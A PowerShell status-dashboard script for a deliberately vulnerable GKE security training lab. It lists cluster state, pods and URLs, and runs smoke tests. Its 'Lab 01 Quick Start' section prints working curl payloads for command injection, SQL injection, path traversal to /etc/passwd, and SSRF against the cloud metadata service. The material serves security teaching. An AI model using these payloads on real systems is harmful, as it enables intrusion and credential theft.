# =============================================================================
# 5C Security Lab - Status Dashboard (PowerShell)
#
# Shows the current state of the deployment:
#   - Cluster connection info
#   - Node external IPs
#   - Pod status (all namespaces involved)
#   - Service endpoints
#   - All relevant URLs (App, AI, GCS, Cloud Console)
#   - Smoke test results
#   - Copy-paste env vars for labs
#
# Usage:
#   $env:PROJECT_ID = "lab-5csec-317009"    # optional; auto-detected
#   .\scripts\show-status.ps1
# =============================================================================

$ErrorActionPreference = "Continue"
$PSNativeCommandUseErrorActionPreference = $false

# -----------------------------------------------------------------------------
# Helpers
# -----------------------------------------------------------------------------
function Write-Header($Text) {
    Write-Host ""
    Write-Host "================================================================" -ForegroundColor Cyan
    Write-Host "  $Text" -ForegroundColor Cyan
    Write-Host "================================================================" -ForegroundColor Cyan
}

function Write-Section($Text) {
    Write-Host ""
    Write-Host "--- $Text ---" -ForegroundColor Yellow
}

function Write-Ok($Text)    { Write-Host "  [OK]  $Text" -ForegroundColor Green }
function Write-Warn($Text)  { Write-Host "  [!]   $Text" -ForegroundColor Yellow }
function Write-Bad($Text)   { Write-Host "  [X]   $Text" -ForegroundColor Red }
function Write-Info($Text)  { Write-Host "  $Text" -ForegroundColor White }
function Write-Label($Text) { Write-Host "  $Text" -NoNewline -ForegroundColor Gray }
function Write-Value($Text) { Write-Host "$Text" -ForegroundColor Green }

# -----------------------------------------------------------------------------
# Resolve Configuration
# -----------------------------------------------------------------------------
$PROJECT_ID = $env:PROJECT_ID
if (-not $PROJECT_ID) {
    $PROJECT_ID = (gcloud config get-value project 2>&1 | Out-String).Trim()
}
if (-not $PROJECT_ID -or $PROJECT_ID -eq "(unset)") {
    Write-Bad "PROJECT_ID not set. Run: `$env:PROJECT_ID = 'your-project-id'"
    exit 1
}

$ZONE         = if ($env:ZONE) { $env:ZONE } else { "us-central1-a" }
$CLUSTER_NAME = if ($env:CLUSTER_NAME) { $env:CLUSTER_NAME } else { "vuln-gke-cluster" }
$BUCKET_NAME  = if ($env:BUCKET_NAME) { $env:BUCKET_NAME } else { "vuln-ai-governance-data-$PROJECT_ID" }
$REGION       = "us-central1"

Write-Header "5C Security Lab - Status Dashboard"
Write-Info "Project:   $PROJECT_ID"
Write-Info "Zone:      $ZONE"
Write-Info "Cluster:   $CLUSTER_NAME"
Write-Info "Bucket:    $BUCKET_NAME"
Write-Info "Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

# -----------------------------------------------------------------------------
# Section 1: Cluster Connection
# -----------------------------------------------------------------------------
Write-Section "Cluster Connection (kubectl cluster-info)"

kubectl cluster-info 2>&1 | Out-String -Stream | ForEach-Object {
    if ($_ -match "Kubernetes control plane.*?(https?://\S+)") {
        Write-Ok "Control plane: $($matches[1])"
    } elseif ($_ -match "is running at (https?://\S+)") {
        Write-Info "$($_.Trim())"
    } elseif ($_ -match "error|refused|timeout") {
        Write-Bad $_.Trim()
    }
}

# -----------------------------------------------------------------------------
# Section 2: Nodes
# -----------------------------------------------------------------------------
Write-Section "Cluster Nodes (kubectl get nodes)"

kubectl get nodes --no-headers 2>&1 | Out-String -Stream | Where-Object { $_ } | ForEach-Object {
    Write-Info $_.Trim()
}

# Extract External IPs via JSON parsing (avoids PowerShell jsonpath quoting bugs)
$nodeExtIPs = @()
$nodeIntIPs = @()
try {
    $nodesJson = kubectl get nodes -o json 2>$null | ConvertFrom-Json
    foreach ($node in $nodesJson.items) {
        $ext = $node.status.addresses | Where-Object { $_.type -eq "ExternalIP" } | Select-Object -ExpandProperty address
        $int = $node.status.addresses | Where-Object { $_.type -eq "InternalIP" } | Select-Object -ExpandProperty address
        if ($ext) { $nodeExtIPs += $ext }
        if ($int) { $nodeIntIPs += $int }
    }
} catch {
    Write-Warn "Could not parse node JSON"
}

$PRIMARY_NODE_IP = if ($nodeExtIPs.Count -gt 0) { $nodeExtIPs[0] } else { $nodeIntIPs[0] }

# -----------------------------------------------------------------------------
# Section 3: Namespaces
# -----------------------------------------------------------------------------
Write-Section "Lab Namespaces"

kubectl get namespaces ai-governance finance-prod --no-headers 2>$null | Out-String -Stream | Where-Object { $_ } | ForEach-Object {
    Write-Info $_.Trim()
}

# -----------------------------------------------------------------------------
# Section 4: Pods
# -----------------------------------------------------------------------------
Write-Section "Pods in ai-governance (kubectl get pods -o wide)"

kubectl get pods -n ai-governance -o wide 2>&1 | Out-String -Stream | Where-Object { $_ } | ForEach-Object {
    if ($_ -match "Running") {
        Write-Host "  $_" -ForegroundColor Green
    } elseif ($_ -match "Error|CrashLoopBackOff|ImagePullBackOff|Pending") {
        Write-Host "  $_" -ForegroundColor Red
    } else {
        Write-Host "  $_" -ForegroundColor Gray
    }
}

# -----------------------------------------------------------------------------
# Section 5: Services
# -----------------------------------------------------------------------------
Write-Section "Services in ai-governance (kubectl get svc)"

kubectl get svc -n ai-governance 2>&1 | Out-String -Stream | Where-Object { $_ } | ForEach-Object {
    Write-Info $_.Trim()
}

# -----------------------------------------------------------------------------
# Section 6: RBAC / ServiceAccounts (for lab context)
# -----------------------------------------------------------------------------
Write-Section "Service Accounts & RBAC"

kubectl get sa -n ai-governance --no-headers 2>$null | Out-String -Stream | Where-Object { $_ } | ForEach-Object {
    Write-Info $_.Trim()
}

kubectl get clusterrolebinding vuln-app-cluster-admin -o jsonpath='{.subjects[*].name}' 2>$null | Out-String -Stream | Where-Object { $_ } | ForEach-Object {
    Write-Warn "ClusterRoleBinding 'vuln-app-cluster-admin' bound to: $($_.Trim())"
}

# -----------------------------------------------------------------------------
# Section 7: Container Images
# -----------------------------------------------------------------------------
Write-Section "Container Images in GCR"

gcloud container images list --repository=gcr.io/$PROJECT_ID --format="value(name)" 2>$null | Out-String -Stream | Where-Object { $_ } | ForEach-Object {
    Write-Info $_.Trim()
}

# -----------------------------------------------------------------------------
# Section 8: GCS Bucket
# -----------------------------------------------------------------------------
Write-Section "GCS Bucket Contents"

gsutil ls "gs://$BUCKET_NAME/" 2>&1 | Out-String -Stream | Where-Object { $_ } | ForEach-Object {
    if ($_ -match "AccessDenied|NotFound") {
        Write-Bad $_.Trim()
    } else {
        Write-Info $_.Trim()
    }
}

# -----------------------------------------------------------------------------
# Section 9: URLs
# -----------------------------------------------------------------------------
Write-Header "Access URLs"

Write-Host ""
Write-Host "  Application:" -ForegroundColor Cyan
foreach ($ip in $nodeExtIPs) {
    Write-Label "    http://"; Write-Value "${ip}:30080"
    Write-Host "      -> /health?check=basic" -ForegroundColor Gray
    Write-Host "      -> /search?q=SAMA" -ForegroundColor Gray
    Write-Host "      -> /download?file=X" -ForegroundColor Gray
    Write-Host "      -> /fetch (POST)" -ForegroundColor Gray
    Write-Host "      -> /ai/query (POST)" -ForegroundColor Gray
}

Write-Host ""
Write-Host "  GCS Bucket:" -ForegroundColor Cyan
Write-Label "    "; Write-Value "gs://$BUCKET_NAME/"
Write-Label "    https://console.cloud.google.com/storage/browser/"; Write-Value "$BUCKET_NAME"

Write-Host ""
Write-Host "  Cloud Console:" -ForegroundColor Cyan
Write-Label "    GKE:        "; Write-Value "https://console.cloud.google.com/kubernetes/clusters/details/$ZONE/$CLUSTER_NAME?project=$PROJECT_ID"
Write-Label "    GCR:        "; Write-Value "https://console.cloud.google.com/gcr/images/$PROJECT_ID"
Write-Label "    IAM:        "; Write-Value "https://console.cloud.google.com/iam-admin/iam?project=$PROJECT_ID"
Write-Label "    Logs:       "; Write-Value "https://console.cloud.google.com/logs/query?project=$PROJECT_ID"
Write-Label "    Vertex AI:  "; Write-Value "https://console.cloud.google.com/vertex-ai?project=$PROJECT_ID"

# -----------------------------------------------------------------------------
# Section 10: Smoke Tests
# -----------------------------------------------------------------------------
Write-Header "Smoke Tests"

if ($PRIMARY_NODE_IP) {
    $endpoints = @(
        @{ Path = "/health?check=basic"; Expected = "healthy"; Name = "App Health" },
        @{ Path = "/"; Expected = "GCC AI Governance"; Name = "Dashboard" },
        @{ Path = "/search?q=SAMA"; Expected = "SAMA"; Name = "Search Endpoint" }
    )

    foreach ($ep in $endpoints) {
        $url = "http://${PRIMARY_NODE_IP}:30080$($ep.Path)"
        try {
            $resp = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
            if ($resp.StatusCode -eq 200) {
                Write-Ok "$($ep.Name): HTTP 200 ($url)"
            } else {
                Write-Warn "$($ep.Name): HTTP $($resp.StatusCode) ($url)"
            }
        } catch {
            Write-Bad "$($ep.Name): Failed ($url)"
        }
    }
} else {
    Write-Warn "No node IP — cannot run smoke tests"
}

# -----------------------------------------------------------------------------
# Section 11: Ready-to-Copy Lab Commands
# -----------------------------------------------------------------------------
Write-Header "Copy-Paste Environment (for labs)"

Write-Host ""
Write-Host "  # PowerShell:" -ForegroundColor Gray
Write-Host "  `$env:NODE_IP    = '$PRIMARY_NODE_IP'" -ForegroundColor White
Write-Host "  `$env:PROJECT_ID = '$PROJECT_ID'" -ForegroundColor White
Write-Host "  `$env:BUCKET_NAME = '$BUCKET_NAME'" -ForegroundColor White
Write-Host ""
Write-Host "  # Bash (Linux/Git Bash):" -ForegroundColor Gray
Write-Host "  export NODE_IP='$PRIMARY_NODE_IP'" -ForegroundColor White
Write-Host "  export PROJECT_ID='$PROJECT_ID'" -ForegroundColor White
Write-Host "  export BUCKET_NAME='$BUCKET_NAME'" -ForegroundColor White

Write-Header "Lab 01 Quick Start"

Write-Host ""
Write-Host "  # Basic health check (baseline)" -ForegroundColor Gray
Write-Host "  curl.exe `"http://${PRIMARY_NODE_IP}:30080/health?check=basic`"" -ForegroundColor White
Write-Host ""
Write-Host "  # OS Command Injection (expect: uid=0(root))" -ForegroundColor Gray
Write-Host "  curl.exe `"http://${PRIMARY_NODE_IP}:30080/health?check=basic';id;echo'`"" -ForegroundColor White
Write-Host ""
Write-Host "  # SQL Injection (expect: sqlite_version in result)" -ForegroundColor Gray
Write-Host "  curl.exe `"http://${PRIMARY_NODE_IP}:30080/search?q=' UNION SELECT 1,sqlite_version(),3,4,5--`"" -ForegroundColor White
Write-Host ""
Write-Host "  # Path Traversal (expect: /etc/passwd contents)" -ForegroundColor Gray
Write-Host "  curl.exe `"http://${PRIMARY_NODE_IP}:30080/download?file=../../../etc/passwd`"" -ForegroundColor White
Write-Host ""
Write-Host "  # SSRF to GCP metadata service" -ForegroundColor Gray
Write-Host "  curl.exe -X POST `"http://${PRIMARY_NODE_IP}:30080/fetch`" ``"
Write-Host "    -H 'Content-Type: application/json' ``"
Write-Host "    -d '{\`"url\`":\`"http://169.254.169.254/computeMetadata/v1/instance/\`"}'" -ForegroundColor White
Write-Host ""

Write-Host ""
Write-Host "  Open dashboard in browser:" -ForegroundColor Cyan
Write-Host "  Start-Process 'http://${PRIMARY_NODE_IP}:30080/'" -ForegroundColor White
Write-Host ""

Write-Header "All Labs"

Write-Host ""
Write-Host "  Intra-layer:" -ForegroundColor Cyan
Write-Host "    Lab 01: labs/lab01-code-injection.md        (Code Layer)"
Write-Host "    Lab 02: labs/lab02-container-misconfig.md   (Container)"
Write-Host "    Lab 03: labs/lab03-cluster-exploitation.md  (Cluster)"
Write-Host "    Lab 04: labs/lab04-cloud-escalation.md      (Cloud)"
Write-Host "    Lab 05: labs/lab05-ai-prompt-injection.md   (AI)"
Write-Host ""
Write-Host "  Cross-layer pivots:" -ForegroundColor Cyan
Write-Host "    Lab 06: labs/lab06-code-to-container.md"
Write-Host "    Lab 07: labs/lab07-container-to-cluster.md"
Write-Host "    Lab 08: labs/lab08-cluster-to-cloud.md"
Write-Host "    Lab 09: labs/lab09-cloud-to-ai.md"
Write-Host "    Lab 10: labs/lab10-ai-to-code.md"
Write-Host ""
Write-Host "  Full chain:" -ForegroundColor Cyan
Write-Host "    Lab 11: labs/lab11-full-attack-chain.md"
Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
